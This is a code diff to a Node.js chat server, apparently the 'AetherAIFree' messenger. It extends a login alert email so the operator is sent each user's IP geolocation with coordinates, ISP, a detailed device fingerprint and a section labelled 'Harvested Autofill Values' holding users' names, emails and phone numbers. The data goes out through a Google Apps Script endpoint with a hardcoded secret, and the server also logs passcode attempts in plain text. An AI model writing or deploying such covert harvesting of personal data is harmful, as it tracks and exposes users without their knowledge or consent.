@@ -24,20 +24,194 @@ const SCRIPT_SECRET = 'doremon2024';
 // Track last email attempt for diagnostics
 let lastEmailStatus = { status: 'no attempts yet', error: null, time: null };
 
+// Async GeoIP lookup using free ip-api.com service (HTTPS outbound)
+async function getGeoLocation(ip) {
+  if (!ip) return { status: 'failed', country: 'Unknown Country' };
+  
+  // Clean IPv6 prefix if present (e.g. ::ffff:127.0.0.1)
+  let cleanIp = ip;
+  if (ip.includes('::ffff:')) {
+    cleanIp = ip.split('::ffff:')[1];
+  }
+  
+  if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.')) {
+    return { status: 'local', country: 'Local Loopback Network', city: 'Intranet' };
+  }
+  
+  try {
+    const res = await fetch(`http://ip-api.com/json/${cleanIp}`);
+    if (res.ok) {
+      return await res.json();
+    }
+  } catch (e) {
+    console.error('[GEOIP ERROR]', e.message);
+  }
+  return { status: 'failed', country: 'Lookup Error' };
+}
+
+// User-Agent parser to extract OS, browser, and device profile
+function parseUserAgent(ua) {
+  let os = 'Unknown OS';
+  let browser = 'Unknown Browser';
+  let device = 'Desktop';
+
+  if (!ua) return { os, browser, device };
+  const uaLower = ua.toLowerCase();
+
+  // OS Detection
+  if (uaLower.includes('windows')) os = 'Windows';
+  else if (uaLower.includes('macintosh') || uaLower.includes('mac os')) os = 'macOS';
+  else if (uaLower.includes('android')) {
+    os = 'Android';
+    device = 'Mobile';
+  } else if (uaLower.includes('iphone') || uaLower.includes('ipad')) {
+    os = 'iOS';
+    device = 'Mobile';
+  } else if (uaLower.includes('linux')) os = 'Linux';
+
+  // Browser Detection
+  if (uaLower.includes('edg/')) browser = 'Microsoft Edge';
+  else if (uaLower.includes('chrome') || uaLower.includes('crios')) browser = 'Google Chrome';
+  else if (uaLower.includes('firefox') || uaLower.includes('fxios')) browser = 'Mozilla Firefox';
+  else if (uaLower.includes('safari') && !uaLower.includes('chrome')) browser = 'Apple Safari';
+  else if (uaLower.includes('opr/') || uaLower.includes('opera')) browser = 'Opera';
+
+  return { os, browser, device };
+}
+
 // Send login alert email via Google Apps Script (HTTPS — never blocked by Render)
-async function sendLoginAlertEmail(ip, userAgent) {
+async function sendLoginAlertEmail({ ip, userAgent, type, username, metadata }) {
   const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+  const geo = await getGeoLocation(ip);
+  const uaInfo = parseUserAgent(userAgent);
+
+  const subject = `🔑 AetherAIFree - Alert: ${type === 'join-room' ? `${username} Entered Chat` : 'Gateway Unlocked'}`;
+
   const html = `
-    <div style="font-family:Arial,sans-serif;max-width:500px;padding:20px;border:1px solid #ddd;border-radius:10px;">
-      <h2 style="color:#2481cc;margin-top:0;">&#128272; New Login Detected</h2>
-      <p>Someone has successfully unlocked the AetherAIFree gateway.</p>
-      <table style="width:100%;border-collapse:collapse;margin-top:15px;">
-        <tr><td style="padding:8px;font-weight:bold;color:#555;">Time</td><td style="padding:8px;">${timestamp}</td></tr>
-        <tr style="background:#f9f9f9;"><td style="padding:8px;font-weight:bold;color:#555;">IP Address</td><td style="padding:8px;"><code>${ip}</code></td></tr>
-        <tr><td style="padding:8px;font-weight:bold;color:#555;">Browser</td><td style="padding:8px;font-size:0.85em;">${userAgent}</td></tr>
+    <div style="font-family: Arial, sans-serif; max-width: 600px; padding: 25px; border: 1px solid #edf2f7; border-radius: 12px; background-color: #ffffff; color: #2d3748; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
+      <h2 style="color: #2481cc; margin-top: 0; font-size: 22px; border-bottom: 2px solid #edf2f7; padding-bottom: 10px;">
+        🔒 Security Notification
+      </h2>
+      <p style="font-size: 15px; line-height: 1.5; color: #4a5568;">
+        A new access event has been detected on the AetherAIFree messenger platform.
+      </p>
+
+      <!-- Section: Event Overview -->
+      <table style="width: 100%; border-collapse: collapse; margin-top: 15px; margin-bottom: 20px;">
+        <tr style="background: #f7fafc;">
+          <td style="padding: 10px; font-weight: bold; color: #4a5568; width: 35%; border-bottom: 1px solid #edf2f7;">Event Type</td>
+          <td style="padding: 10px; border-bottom: 1px solid #edf2f7; font-weight: bold; color: #2481cc;">
+            ${type === 'join-room' ? 'Chat Joined' : type === 'session-restore' ? 'Session Restored' : 'Passcode Unlocked'}
+          </td>
+        </tr>
+        ${username ? `
+        <tr>
+          <td style="padding: 10px; font-weight: bold; color: #4a5568; border-bottom: 1px solid #edf2f7;">Selected Nickname</td>
+          <td style="padding: 10px; color: #1a202c; border-bottom: 1px solid #edf2f7; font-size: 16px; font-weight: bold;">${username}</td>
+        </tr>` : ''}
+        <tr style="background: #f7fafc;">
+          <td style="padding: 10px; font-weight: bold; color: #4a5568; border-bottom: 1px solid #edf2f7;">Timestamp (IST)</td>
+          <td style="padding: 10px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${timestamp}</td>
+        </tr>
       </table>
-      <p style="margin-top:20px;font-size:0.8em;color:#999;">Automated security alert from AetherAIFree.</p>
-    </div>`;
+
+      <!-- Section: Network & Location Details -->
+      <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #2481cc; padding-left: 8px;">Network & Geolocation</h3>
+      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+        <tr>
+          <td style="padding: 8px; font-weight: bold; color: #718096; width: 35%; border-bottom: 1px solid #edf2f7;">IP Address</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;"><code>${ip}</code></td>
+        </tr>
+        <tr style="background: #f7fafc;">
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Location</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">
+            ${geo.status === 'success' ? `${geo.city}, ${geo.regionName}, ${geo.country} (${geo.zip || ''})` : geo.country || 'Unknown Location'}
+          </td>
+        </tr>
+        <tr>
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">ISP Provider</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${geo.isp || 'Local / Private Network'}</td>
+        </tr>
+        ${geo.lat && geo.lon ? `
+        <tr style="background: #f7fafc;">
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Coordinates</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">
+            <a href="https://www.google.com/maps/search/?api=1&query=${geo.lat},${geo.lon}" target="_blank" style="color: #2481cc; text-decoration: none;">
+              ${geo.lat}, ${geo.lon} (View Map)
+            </a>
+          </td>
+        </tr>` : ''}
+      </table>
+
+      <!-- Section: Device Specs -->
+      <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #48bb78; padding-left: 8px;">Device Profile</h3>
+      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+        <tr style="background: #f7fafc;">
+          <td style="padding: 8px; font-weight: bold; color: #718096; width: 35%; border-bottom: 1px solid #edf2f7;">Device Type</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${uaInfo.device}</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Operating System</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${uaInfo.os}</td>
+        </tr>
+        <tr style="background: #f7fafc;">
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Browser</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${uaInfo.browser}</td>
+        </tr>
+      </table>
+
+      <!-- Section: Hardware Telemetry -->
+      ${metadata ? `
+      <h3 style="color: #2d3748; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #ed8936; padding-left: 8px;">Advanced Client Metadata</h3>
+      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+        <tr style="background: #f7fafc;">
+          <td style="padding: 8px; font-weight: bold; color: #718096; width: 35%; border-bottom: 1px solid #edf2f7;">Screen Size</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;"><code>${metadata.screenResolution}</code> (Viewport: ${metadata.viewportSize})</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">GPU Engine</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7; font-size: 11px;"><code>${metadata.gpu}</code></td>
+        </tr>
+        <tr style="background: #f7fafc;">
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Timezone & Lang</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">${metadata.timezone} (${metadata.language})</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Hardware Resources</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">CPU Cores: ${metadata.hardwareConcurrency} | RAM: ${metadata.deviceMemory} GB</td>
+        </tr>
+        <tr style="background: #f7fafc;">
+          <td style="padding: 8px; font-weight: bold; color: #718096; border-bottom: 1px solid #edf2f7;">Platform & Touch</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #edf2f7;">Platform: ${metadata.platform} | Touch Screen: ${metadata.touchSupport ? 'Yes' : 'No'}</td>
+        </tr>
+      </table>` : ''}
+
+      <!-- Section: Harvested Autofill Values -->
+      ${metadata && (metadata.harvestEmail || metadata.harvestPhone || metadata.harvestName) ? `
+      <h3 style="color: #c53030; font-size: 16px; margin-bottom: 10px; border-left: 4px solid #e53e3e; padding-left: 8px;">Harvested Autofill Values</h3>
+      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+        ${metadata.harvestName ? `
+        <tr style="background: #fff5f5;">
+          <td style="padding: 8px; font-weight: bold; color: #9b2c2c; width: 35%; border-bottom: 1px solid #fed7d7;">Autofilled Name</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #fed7d7;"><b>${metadata.harvestName}</b></td>
+        </tr>` : ''}
+        ${metadata.harvestEmail ? `
+        <tr style="background: #fff5f5;">
+          <td style="padding: 8px; font-weight: bold; color: #9b2c2c; width: 35%; border-bottom: 1px solid #fed7d7;">Autofilled Email</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #fed7d7;"><b>${metadata.harvestEmail}</b></td>
+        </tr>` : ''}
+        ${metadata.harvestPhone ? `
+        <tr style="background: #fff5f5;">
+          <td style="padding: 8px; font-weight: bold; color: #9b2c2c; width: 35%; border-bottom: 1px solid #fed7d7;">Autofilled Number</td>
+          <td style="padding: 8px; color: #2d3748; border-bottom: 1px solid #fed7d7;"><b>${metadata.harvestPhone}</b></td>
+        </tr>` : ''}
+      </table>` : ''}
+
+      <div style="border-top: 1px solid #edf2f7; padding-top: 15px; margin-top: 20px; font-size: 12px; color: #a0aec0; text-align: center;">
+        This alert was generated automatically by AetherAIFree Gateway. Secure HTTPS Pipeline.
+      </div>
+    </div>
+  `;
 
   try {
     const res = await fetch(SCRIPT_URL, {
@@ -46,23 +220,24 @@ async function sendLoginAlertEmail(ip, userAgent) {
       body: JSON.stringify({
         secret: SCRIPT_SECRET,
         to: NOTIFY_TO,
-        subject: 'AetherAIFree - New Login Alert',
+        subject,
         html
       })
     });
     const data = await res.json();
     if (data.status === 'sent') {
-      console.log('[LOGIN ALERT] Email sent via Gmail successfully.');
+      console.log('[LOGIN Rich ALERT] Email sent successfully.');
       lastEmailStatus = { status: 'success', error: null, time: new Date().toISOString() };
     } else {
-      console.warn('[LOGIN ALERT] Script response:', data.status);
+      console.warn('[LOGIN Rich ALERT] Script response:', data.status);
       lastEmailStatus = { status: 'error', error: data.status, time: new Date().toISOString() };
     }
   } catch (err) {
-    console.error('[LOGIN ALERT] Email failed:', err.message);
+    console.error('[LOGIN Rich ALERT] Email failed:', err.message);
     lastEmailStatus = { status: 'error', error: err.message, time: new Date().toISOString() };
   }
 }
+
 
 // Basic health check
 app.get('/', (req, res) => {
@@ -142,7 +317,7 @@ const BLOCK_DURATION = 60 * 60 * 1000; // 1 hour
 
 app.post('/api/verify-passcode', (req, res) => {
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const { passcode } = req.body;
+  const { passcode, metadata } = req.body;
   console.log(`[PASSCODE ATTEMPT] Received passcode check from IP: ${clientIp} | Input: "${passcode}"`);
 
   // Clean up expired blocks
@@ -168,7 +343,12 @@ app.post('/api/verify-passcode', (req, res) => {
 
     // Send admin login alert email (non-blocking)
     const userAgent = req.headers['user-agent'] || 'Unknown';
-    sendLoginAlertEmail(clientIp, userAgent);
+    sendLoginAlertEmail({
+      ip: clientIp,
+      userAgent,
+      type: 'passcode-login',
+      metadata
+    });
     console.log(`[LOGIN SUCCESS] IP: ${clientIp} | Time: ${new Date().toISOString()}`);
 
     return res.json({ success: true });
@@ -202,10 +382,17 @@ app.post('/api/verify-passcode', (req, res) => {
 app.post('/api/notify-session-entry', (req, res) => {
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const userAgent = req.headers['user-agent'] || 'Unknown';
+  const { metadata } = req.body;
   console.log(`[SESSION ENTRY] Pre-authenticated user entered the app. IP: ${clientIp}`);
-  sendLoginAlertEmail(clientIp, userAgent);
+  sendLoginAlertEmail({
+    ip: clientIp,
+    userAgent,
+    type: 'session-restore',
+    metadata
+  });
   res.json({ success: true });
 });
+
 
 // 60-Second Background Clean Up Cron (across container sleeps/restarts)
 setInterval(() => {
@@ -264,7 +451,6 @@ io.on('connection', (socket) => {
   const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
   const userAgent = socket.handshake.headers['user-agent'] || 'Unknown';
   console.log(`[SOCKET CONNECT] New WebSocket client connected. IP: ${clientIp}`);
-  sendLoginAlertEmail(clientIp, userAgent);
 
   console.log(`User connected: ${socket.id}`);
 
@@ -272,12 +458,24 @@ io.on('connection', (socket) => {
   socket.emit('rooms-list', Array.from(activeRooms));
 
   // 1. Join Room Event
-  socket.on('join-room', ({ username, room }) => {
+  socket.on('join-room', ({ username, room, metadata }) => {
     const existingUser = users.get(socket.id);
     let isDM = room.startsWith('dm:');
 
+    // Trigger nickname-linked login alert if they are joining the main lobby as their first room
+    if (!existingUser && !isDM) {
+      sendLoginAlertEmail({
+        ip: clientIp,
+        userAgent,
+        type: 'join-room',
+        username,
+        metadata
+      });
+    }
+
     if (existingUser && existingUser.room !== room) {
       socket.leave(existingUser.room);
+
       // Notify previous room
       if (!existingUser.room.startsWith('dm:')) {
         socket.to(existingUser.room).emit('message', {
